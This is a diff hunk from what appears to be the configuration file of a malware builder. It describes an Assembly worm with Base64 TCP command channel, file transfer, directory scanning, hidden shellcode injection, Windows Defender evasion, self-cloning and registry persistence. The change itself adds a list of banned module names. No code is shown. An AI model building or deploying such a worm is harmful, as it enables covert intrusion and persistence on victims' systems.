@@ -3,6 +3,7 @@
 #!info##A test-stage worm written entirely in Assembly. Connects via a TCP socket and communicates using Base64-encoded messages (requires a b64-type server). Includes several basic features such as displaying a message box, creating an additional TCP socket for file transfer, directory scanning, and space for injecting two different shellcodes. The shellcodes are injected in chunks and hidden in memory. Upon execution, the worm uses basic techniques to evade Windows Defender, then attempts to clone itself and add a startup entry in the system registry. A list of available commands can be accessed via the help command.
 #!lang##asm
 #!system_FLAG##[W]
+#!banned##module##starter##shadow##junk
 #!globalVar##COMPILER##mingw-x64##The name of the compiler to build the executable file.
 #!globalVar##NO_DLL##True##Not include DLLs
 #!processWorm##WormLib
